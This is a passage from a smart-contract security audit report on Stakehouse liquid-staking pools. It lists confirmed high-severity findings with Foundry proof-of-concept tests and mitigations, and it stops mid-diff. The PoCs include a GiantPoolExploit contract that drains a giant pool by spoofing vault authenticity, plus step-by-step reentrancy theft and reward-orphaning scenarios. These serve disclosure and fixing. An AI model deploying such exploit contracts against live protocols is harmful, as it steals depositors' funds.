vm.expectRevert(\"Cannot burn LP tokens\");\n        savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));\n        vm.stopPrank();\n    }\n\n```\n\nTo run the POC execute: ` yarn test -m testLockStakersFunds -v  `\n\nExpected output:\n\n    Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n    [PASS] testLockStakersFunds() (gas: 1731537)\n    Test result: ok. 1 passed; 0 failed; finished in 8.21ms\n\nTo see the full trace, execute: `yarn test -m testLockStakersFunds -vvvv`\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\n1.  Add a reentrancy guard to `withdrawETHForKnot` and `stake`\n2.  Keep proper accounting for ETH deposited by node runner for each BLS key\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176)**\n\n\n\n***\n\n## [[H-12] Sender transferring `GiantMevAndFeesPool` tokens can afterward experience pool DOS and orphaning of future rewards](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178)\n*Submitted by [9svR6w](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178), also found by [JTJabba](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/358), [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/269), and [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/206)*\n\nWhen a user transfers away GiantMevAndFeesPool tokens, the pool's claimed\\[] computed is left unchanged and still corresponds to what they had claimed with their old (higher) number of tokens. (See GiantMevAndFeesPool afterTokenTransfer() - no adjustment is made to claimed\\[] on the from side.) As a result, their claimed\\[] may be higher than the max amount they could possibly have claimed for their new (smaller) number of tokens. The erroneous claimed value can cause an integer overflow when the claimed\\[] value is subtracted, leading to inability for this user to access some functions of the GiantMevAndFeesPool - including such things as being able to transfer their tokens (overflow is triggered in a callback attempting to pay out their rewards). These overflows will occur in SyndicateRewardsProcessor's \\_previewAccumulatedETH() and \\_distributeETHRewardsToUserForToken(), the latter of which is called in a number of places. When rewards are later accumulated in the pool, the user will not be able to claim certain rewards owed to them because of the incorrect (high) claimed\\[] value. The excess rewards will be orphaned in the pool.\n\n#### Proof of Concept\n\nThis patch demonstrates both DOS and orphaned rewards due to the claimed\\[] error described above. Note that the patch includes a temp fix for the separate issue calculating claimed\\[] in \\_distributeETHRewardsToUserForToken() in order to demonstrate this is a separate issue.\n\nRun test\n\n    forge test -m testTransferDOSUserOrphansFutureRewards\n\nPatch\n\n```diff\ndiff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\nindex 81be706..ca44ae6 100644\n--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {\n             // Calculate how much ETH rewards the address is owed / due \n             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n             if (due > 0) {\n-                claimed[_user][_token] = due;\n+                claimed[_user][_token] += due; // temp fix claimed calculation\n \n                 totalClaimed += due;\n \ndiff --git a/test/foundry/GiantPools.t.sol b/test/foundry/GiantPools.t.sol\nindex 7e8bfdb..6468373 100644\n--- a/test/foundry/GiantPools.t.sol\n+++ b/test/foundry/GiantPools.t.sol\n@@ -5,14 +5,18 @@ pragma solidity ^0.8.13;\n import \"forge-std/console.sol\";\n import { TestUtils } from \"../utils/TestUtils.sol\";\n \n+import { MockLiquidStakingManager } from \"../../contracts/testing/liquid-staking/MockLiquidStakingManager.sol\";\n import { GiantSavETHVaultPool } from \"../../contracts/liquid-staking/GiantSavETHVaultPool.sol\";\n import { GiantMevAndFeesPool } from \"../../contracts/liquid-staking/GiantMevAndFeesPool.sol\";\n import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n+import { GiantLP } from \"../../contracts/liquid-staking/GiantLP.sol\";\n import { MockSlotRegistry } from \"../../contracts/testing/stakehouse/MockSlotRegistry.sol\";\n import { MockSavETHVault } from \"../../contracts/testing/liquid-staking/MockSavETHVault.sol\";\n import { MockGiantSavETHVaultPool } from \"../../contracts/testing/liquid-staking/MockGiantSavETHVaultPool.sol\";\n import { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n \n+import \"forge-std/console.sol\";\n+\n contract GiantPoolTests is TestUtils {\n \n     MockGiantSavETHVaultPool public giantSavETHPool;\n@@ -116,4 +120,171 @@ contract GiantPoolTests is TestUtils {\n         assertEq(dETHToken.balanceOf(savETHUser), 24 ether);\n     }\n \n+    function addNewLSM(address payable giantFeesAndMevPool, bytes memory blsPubKey) public returns (address payable) {\n+        manager = deployNewLiquidStakingNetwork(\n+            factory,\n+            admin,\n+            true,\n+            \"LSDN\"\n+        );\n+\n+        savETHVault = MockSavETHVault(address(manager.savETHVault()));\n+\n+        giantSavETHPool = new MockGiantSavETHVaultPool(factory, savETHVault.dETHToken());\n+\n+        // Set up users and ETH\n+        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n+        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n+\n+        // Register BLS key\n+        registerSingleBLSPubKey(nodeRunner, blsPubKey, accountFour);\n+\n+        // Deposit ETH into giant savETH\n+        vm.prank(savETHUser);\n+        giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n+        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n+        assertEq(address(giantSavETHPool).balance, 24 ether);\n+\n+        // Deploy ETH from giant LP into savETH pool of LSDN instance\n+        bytes[][] memory blsKeysForVaults = new bytes[][](1);\n+        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKey);\n+\n+        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);\n+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n+\n+        giantSavETHPool.batchDepositETHForStaking(\n+            getAddressArrayFromValues(address(manager.savETHVault())),\n+            getUint256ArrayFromValues(24 ether),\n+            blsKeysForVaults,\n+            stakeAmountsForVaults\n+        );\n+        assertEq(address(manager.savETHVault()).balance, 24 ether);\n+\n+        assert(giantFeesAndMevPool.balance >= 4 ether);\n+        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);\n+        GiantMevAndFeesPool(giantFeesAndMevPool).batchDepositETHForStaking(\n+            getAddressArrayFromValues(address(manager.stakingFundsVault())),\n+            getUint256ArrayFromValues(4 ether),\n+            blsKeysForVaults,\n+            stakeAmountsForVaults\n+        );\n+\n+        // Ensure we can stake and mint derivatives\n+        stakeAndMintDerivativesSingleKey(blsPubKey);\n+\n+        return payable(manager);\n+    }\n+\n+    function testTransferDOSUserOrphansFutureRewards() public {\n+\n+        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 8 ether);\n+        address feesAndMevUserTwo = accountFour;\n+\n+       // Deposit ETH into giant fees and mev\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.depositETH{value: 8 ether}(8 ether);\n+        vm.stopPrank();\n+\n+        MockLiquidStakingManager manager1 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyOne));\n+        MockLiquidStakingManager manager2 = MockLiquidStakingManager(addNewLSM(payable(giantFeesAndMevPool), blsPubKeyTwo));\n+\n+        bytes[][] memory blsPubKeyOneInput = new bytes[][](1);\n+        blsPubKeyOneInput[0] = getBytesArrayFromBytes(blsPubKeyOne);\n+\n+        bytes[][] memory blsPubKeyTwoInput = new bytes[][](1);\n+        blsPubKeyTwoInput[0] = getBytesArrayFromBytes(blsPubKeyTwo);\n+\n+        vm.warp(block.timestamp + 3 hours);\n+\n+        // Add 2 eth rewards to manager1's staking funds vault.\n+        vm.deal(address(manager1.stakingFundsVault()), 2 ether);\n+\n+        // Claim rewards into the giant pool and distribute them to user one.\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.claimRewards(\n+            feesAndMevUserOne,\n+            getAddressArrayFromValues(address(manager1.stakingFundsVault())),\n+            blsPubKeyOneInput);\n+        vm.stopPrank();\n+\n+        // User one has received all the rewards and has no more previewed rewards.\n+        assertEq(feesAndMevUserOne.balance, 2 ether);\n+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 2 ether);\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserOne,\n+                new address[](0),\n+                new LPToken[][](0)),\n+                0);\n+\n+        // Check the claimed[] value for user 1. It is correct.\n+        assertEq(\n+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),\n+            2 ether);\n+\n+        // User one transfers half their giant tokens to user 2.\n+        vm.startPrank(feesAndMevUserOne);\n+        giantFeesAndMevPool.lpTokenETH().transfer(feesAndMevUserTwo, 4 ether);\n+        vm.stopPrank();\n+\n+        // After the tokens have been transferred to user 2, user 1's claimed[] remains\n+        // unchanged - and is higher than the accumulated payout per share for user 1's\n+        // current number of shares.\n+        assertEq(\n+            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())),\n+            2 ether);\n+\n+        // With this incorrect value of claimed[] causing a subtraction underflow, user one\n+        // cannot preview accumulated eth or perform any action that attempts to claim their\n+        // rewards such as transferring their tokens.\n+        vm.startPrank(feesAndMevUserOne);\n+        vm.expectRevert();\n+        giantFeesAndMevPool.previewAccumulatedETH(\n+            feesAndMevUserOne,\n+            new address[](0),\n+            new LPToken[][](0));\n+\n+        console.log(\"the revert expected now\");\n+        GiantLP token = giantFeesAndMevPool.lpTokenETH();\n+        vm.expectRevert();\n+        token.transfer(feesAndMevUserTwo, 1 ether);\n+        vm.stopPrank();\n+\n+        // Add 1 eth rewards to manager2's staking funds vault.\n+        vm.deal(address(manager2.stakingFundsVault()), 2 ether);\n+\n+        // User 2 claims rewards into the giant pool and obtains its 1/2 share.\n+        vm.startPrank(feesAndMevUserTwo);\n+        giantFeesAndMevPool.claimRewards(\n+            feesAndMevUserTwo,\n+            getAddressArrayFromValues(address(manager2.stakingFundsVault())),\n+            blsPubKeyTwoInput);\n+        vm.stopPrank();\n+        assertEq(feesAndMevUserTwo.balance, 1 ether);\n+\n+        // At this point, user 1 ought to have accumulated 1 ether from the rewards,\n+        // however accumulated eth is listed as 0.\n+        // The reason is that when the giant pool tokens were transferred to\n+        // user two, the claimed[] value for user one was left unchanged.\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserOne,\n+                new address[](0),\n+                new LPToken[][](0)),\n+                0);\n+\n+        // The pool has received 4 eth rewards and paid out 3, but no users\n+        // are listed as having accumulated the eth. It is orphaned.\n+        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 4 ether);\n+        assertEq(giantFeesAndMevPool.totalClaimed(), 3 ether);\n+\n+        assertEq(\n+            giantFeesAndMevPool.previewAccumulatedETH(\n+                feesAndMevUserTwo,\n+                new address[](0),\n+                new LPToken[][](0)),\n+                0);\n+\n+    }\n+\n }\n\\ No newline at end of file\n\n```\n\n### Recommended Mitigation Steps\n\nReduce `claimed[]` when necessary on the from side when GiantMevAndFeesPool tokens are transferred. Alternatively, claimed\\[] could be calculated on a per share basis rather than a total basis in order to simplify some of the adjustments that must be made in the code for claimed\\[].\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/178)**\n\n\n\n***\n\n## [[H-13] Possible reentrancy and fund theft in `withdrawDETH()` of `GiantSavETHVaultPool` because there is no whitelist check for user provided Vaults and there is no reentrancy defense](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226)\n*Submitted by [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226)*\n\nFunction `withdrawDETH()` in `GiantSavETHVaultPool` allows a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. This function make external calls to user provided addresses without checking those addresses and send increased dETH balance of contract during the call to user. User can provide malicious addresses to contract and then took the execution flow during the transaction and increase dETH balance of contract by other calls and make contract to transfer them to him.\n\n### Proof of Concept\n\nThis is `withdrawDETH()` in `GiantSavETHVaultPool`  code:\n\n        /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults\n        /// @param _savETHVaults List of savETH vaults being interacted with\n        /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH\n        /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH\n        function withdrawDETH(\n            address[] calldata _savETHVaults,\n            LPToken[][] calldata _lpTokens,\n            uint256[][] calldata _amounts\n        ) external {\n            uint256 numOfVaults = _savETHVaults.length;\n            require(numOfVaults > 0, \"Empty arrays\");\n            require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n            require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n            // Firstly capture current dETH balance and see how much has been deposited after the loop\n            uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n            for (uint256 i; i < numOfVaults; ++i) {\n                SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n                // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n                for (uint256 j; j < _lpTokens[i].length; ++j) {\n                    LPToken token = _lpTokens[i][j];\n                    uint256 amount = _amounts[i][j];\n\n                    // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                    _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                    require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                    // Giant LP is burned 1:1 with LPs from sub-networks\n                    require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");\n\n                    // Burn giant LP from user before sending them dETH\n                    lpTokenETH.burn(msg.sender, amount);\n\n                    emit LPBurnedForDETH(address(token), msg.sender, amount);\n                }\n\n                // Ask\n                vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n            }\n\n            // Calculate how much dETH has been received from burning\n            dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;\n\n            // Send giant LP holder dETH owed\n            getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n        }\n\nAs you can see first contract save the dETH balance of contract by this line: `uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));` and then it loops through user provided vaults addresses and call those vaults to withdraw dETH and in the end it calculates `dETHReceivedFromAllSavETHVaults` and transfer those dETH to user: `  getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults); `. attacker can perform these steps:\n1. create a malicious contract `AttackerVault` which is copy of `SavETHVault` with modifiction.\n2. call `withdrawDETH()` with Vault list `[ValidVault1, ValidVault2, AttackerVault, ValidVaul3]`.\n3. contract would save the dETH balance of itself and then loops through Vaults to validate and burn LPTokens.\n4. contract would reach Vault `AttackerVault` and call attacker controlled address.\n5. attacker contract call other functions to increase dETH balance of contract (if it's not possible to increase dETH balance of contract by other way so there is no need to save contract initial balance of dETH before the loop and dETH balance of contract would be zero always)\n6. `withdrawDETH()` would finish the loop and transfer all the increase dETH balance to attacker which includes extra amounts.\n\nBecause contract don't check the provided addresses and calls them and there is no reentrancy defense mechanism there is possibility of reentrancy attack which can cause fund lose.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nCheck the provided addresses and also have some reentrancy defense mechanisim.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226)**\n\n\n\n***\n\n## [[H-14] Fund lose in function `bringUnusedETHBackIntoGiantPool()` of `GiantSavETHVaultPool` ETH gets back to giant pool but the value of idleETH don't increase](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229)\n*Submitted by [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L133-L157><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L24-L25><br>\n\nVariable `idleETH` in giant pools is storing total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network and whenever a deposit or withdraw happens contract adjust the value of `idleETH` of contract, but in function `bringUnusedETHBackIntoGiantPool()` which brings unused ETH from savETH vault to giant pool the value of `idleETH` don't get increased which would cause those ETH balance to not be accessible for future staking or withdrawing.\n\n### Proof of Concept\n\nThis is `bringUnusedETHBackIntoGiantPool()` code in `GiantSavETHVaultPool()`:\n\n        /// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool\n        /// @param _savETHVaults List of savETH vaults where ETH is staked\n        /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault\n        /// @param _amounts Amounts of LP within the giant pool being burnt\n        function bringUnusedETHBackIntoGiantPool(\n            address[] calldata _savETHVaults,\n            LPToken[][] calldata _lpTokens,\n            uint256[][] calldata _amounts\n        ) external {\n            uint256 numOfVaults = _savETHVaults.length;\n            require(numOfVaults > 0, \"Empty arrays\");\n            require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n            require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n            for (uint256 i; i < numOfVaults; ++i) {\n                SavETHVault vault = SavETHVault(_savETHVaults[i]);\n                for (uint256 j; j < _lpTokens[i].length; ++j) {\n                    require(\n                        vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,\n                        \"ETH is either staked or derivatives minted\"\n                    );\n                }\n\n                vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n            }\n        }\n\nAs you can see it checks that ETH is available in savETH vault and then calls to `burnLPTokens()` to burn savETH LP tokens and bring unused ETH to giant pool address, this would increase giant pool ETH balance but code don't increase the `idleETH` value so contract would lose tracking of real idle ETH balance of contract. because the vaule of `idleETH` is used when withdrawing or depositing into savETH vaults so the contract can't reuse the returned ETH. these are the steps that cause this bug to happen:\n1. giant pool has 100 `idleETH`.\n2. with function `batchDepositETHForStaking()` users stake 80 `ETH` and the new value of `idleETH` would be `20` and contract LP Token balance increase by 80.\n3. the 80 newly staked ETH is not yet staked in `stakehouse`.\n4. with function `bringUnusedETHBackIntoGiantPool()` users bring back those 80 `ETH` from Vaults to giant pool and burn giant pool LP tokens and then giant pool have 100 idle ETH but because `idleETH` value don't get increase it still would show `20`.\n5. the extra 80 ETH would returned to giant pool wouldn't be accessible for withdrawing to users or depositing into Vaults because in withdrawing or depositing into Vaults the value of `idleETH` has been used to know the amount of idle ETH in giant pool and because the value doesn't show the correct amount so the extra amount of ETH wouldn't be lost.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nContract should correctly update value of `idleETH` in different actions because withdraw and deposit logics depend on it.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/229)**\n\n\n\n***\n\n## [[H-15] User loses remaining rewards in `GiantMevAndFeesPool` when new deposits happen because `_onDepositETH()` set `claimed[][]` to max without transferring user remaining rewards](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240)\n*Submitted by [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L195-L204><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L33-L48><br>\n\nWhen `depositETH()` is called in giant pool it calls `_onDepositETH()` which calls `_setClaimedToMax()` to make sure new ETH stakers are not entitled to ETH earned by but this can cause users to lose their remaining rewards when they deposits. code should first transfer user remaining rewards when deposit happens.\n\n### Proof of Concept\n\nThis is `depositETH()` code in `GiantPoolBase`:\n\n        /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.\n        function depositETH(uint256 _amount) public payable {\n            require(msg.value >= MIN_STAKING_AMOUNT, \"Minimum not supplied\");\n            require(msg.value == _amount, \"Value equal to amount\");\n\n            // The ETH capital has not yet been deployed to a liquid staking network\n            idleETH += msg.value;\n\n            // Mint giant LP at ratio of 1:1\n            lpTokenETH.mint(msg.sender, msg.value);\n\n            // If anything extra needs to be done\n            _onDepositETH();\n\n            emit ETHDeposited(msg.sender, msg.value);\n        }\n\nAs you can see it increase user `lpTokenETH` balance and then calls `_onDepositETH()`. This is `_onDepositETH()` and `_setClaimedToMax()` code in `GiantMevAndFeesPool` contract:\n\n        /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n        function _onDepositETH() internal override {\n            _setClaimedToMax(msg.sender);\n        }\n\n        /// @dev Internal re-usable method for setting claimed to max for msg.sender\n        function _setClaimedToMax(address _user) internal {\n            // New ETH stakers are not entitled to ETH earned by\n            claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n        }\n\nAs you can see the code set `claimed[msg.sender][address(lpTokenETH]` to maximum value so the user wouldn't be entitled to previous rewards but if user had some remaining rewards in contract he would lose those rewards can't withdraw them. these are the steps:\n1. `user1` deposit `10` ETH to giant pool and `accumulatedETHPerLPShare` value is `2` and `claimed[user1][lpTokenETH]` would be `10 * 2 = 20`.\n2. some time passes and `accumulatedETHPerLPShare` set to `4` and `user1` has `10 * 4 - 20 = 20` unclaimed ETH rewards (the formula in the code: `balance * rewardPerShare - claimed`).\n3. `user` deposit `5` ETH to giant pool and `accumulatedETHPerLPShare` is `4` so the code would call `_onDepositETH()` which calls `_setClaimedToMax` which sets `claimed[user1][lpTokenETH]` to `15 * 4 = 60`.\n4. `user1` new remaining ETH reward would be `15 * 4 - 60 = 0`. and `user1` won't receive his rewards because when he deposits contract don't transfer remaining rewards and set claim to max so user loses his funds.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nWhen deposit happens, contract should first send remaining rewards, then increase the user's balance and then set the user claim to max.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/240)**\n\n\n\n***\n\n## [[H-16] Reentrancy vulnerability in GiantMevAndFeesPool.withdrawETH](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244)\n*Submitted by [cccz](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244)*\n\nGiantMevAndFeesPool.withdrawETH calls lpTokenETH.burn, then GiantMevAndFeesPool.beforeTokenTransfer, followed by a call to \\_distributeETHRewardsToUserForToken sends ETH to the user, which allows the user to call any function in the fallback. While GiantMevAndFeesPool.withdrawETH has the nonReentrant modifier, GiantMevAndFeesPool.claimRewards does not have the nonReentrant modifier.<br>\nWhen GiantMevAndFeesPool.claimRewards is called in GiantMevAndFeesPool.withdrawETH, the idleETH is reduced but the ETH is not yet sent to the user, which increases totalRewardsReceived and accumulatedETHPerLPShare, thus making the user receive more rewards when calling GiantMevAndFeesPool.claimRewards.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64>\n\n### Recommended Mitigation Steps\n\nChange to\n\n```diff\nfunction withdrawETH(uint256 _amount) external nonReentrant {\n    require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n    require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");\n    require(idleETH >= _amount, \"Come back later or withdraw less ETH\");\n\n-  idleETH -= _amount;\n\n    lpTokenETH.burn(msg.sender, _amount);\n+  idleETH -= _amount;\n\n    (bool success,) = msg.sender.call{value: _amount}(\"\");\n    require(success, \"Failed to transfer ETH\");\n\n    emit LPBurnedForETH(msg.sender, _amount);\n}\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244)**\n\n\n\n***\n\n## [[H-17] Giant pools can be drained due to weak vault authenticity check](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251)\n*Submitted by [Jeiwan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251), also found by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/420), [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/361), [immeas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/325), [JTJabba](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/307), [arcoun](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/301), [bin2chen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/282), [imare](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/266), [wait](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/258), [unforgiven](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/220), [satoshipotato](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/195), [ronnyx2017](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/166), [Lambda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/139), [hihen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/136), [bitbopper](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/128), [fs0c](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/122), [banky](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/112), [9svR6w](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/96), [c7e7eff](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/87), [perseverancesuccess](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/61), [0xdeadbeef0x](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/47), and [clems4ever](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/36)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44>\n\nAn attacker can withdraw all ETH staked by users in a Giant pool. Both `GiantSavETHVaultPool` and `GiantMevAndFeesPool` are affected.\n\n### Proof of Concept\n\nThe `batchDepositETHForStaking` function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)):\n\n```solidity\nSavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\nrequire(\n    liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n    \"Invalid liquid staking manager\"\n);\n\n// Deposit ETH for staking of BLS key\nsavETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n    _blsPublicKeys[i],\n    _stakeAmounts[i]\n);\n```\n\nAn attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:\n\n```solidity\n// test/foundry/GiantPools.t.sol\ncontract GiantPoolExploit {\n    address immutable owner = msg.sender;\n    address validStakingManager;\n\n    constructor(address validStakingManager_) {\n        validStakingManager = validStakingManager_;\n    }\n\n    function liquidStakingManager() public view returns (address) {\n        return validStakingManager;\n    }\n\n    function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {\n        payable(owner).transfer(address(this).balance);\n    }\n}\n\nfunction testPoolDraining_AUDIT() public {\n    // Register BLS key\n    address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n    // Set up users and ETH\n    address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n\n    address attacker = address(0x1337);\n    vm.label(attacker, \"attacker\");\n    vm.deal(attacker, 1 ether);\n\n    // User deposits ETH into Giant savETH\n    vm.prank(savETHUser);\n    giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n    assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n    assertEq(address(giantSavETHPool).balance, 24 ether);\n\n    // Attacker deploys an exploit.\n    vm.startPrank(attacker);\n    GiantPoolExploit exploit = new GiantPoolExploit(address(manager));\n    vm.stopPrank();\n\n    // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.\n    bytes[][] memory blsKeysForVaults = new bytes[][](1);\n    blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n    uint256[][] memory stakeAmountsForVaults = new uint256[][](1);\n    stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n    giantSavETHPool.batchDepositETHForStaking(\n        getAddressArrayFromValues(address(exploit)),\n        getUint256ArrayFromValues(24 ether),\n        blsKeysForVaults,\n        stakeAmountsForVaults\n    );\n\n    // Vault got nothing.\n    assertEq(address(manager.savETHVault()).balance, 0 ether);\n    // Attacker has stolen user's deposit.\n    assertEq(attacker.balance, 25 ether);\n}\n```\n\n### Recommended Mitigation Steps\n\nConsider taking a list of `LiquidStakingManager` addresses instead of vault addresses:\n\n```diff\n--- a/contracts/liquid-staking/GiantSavETHVaultPool.sol\n+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol\n@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is 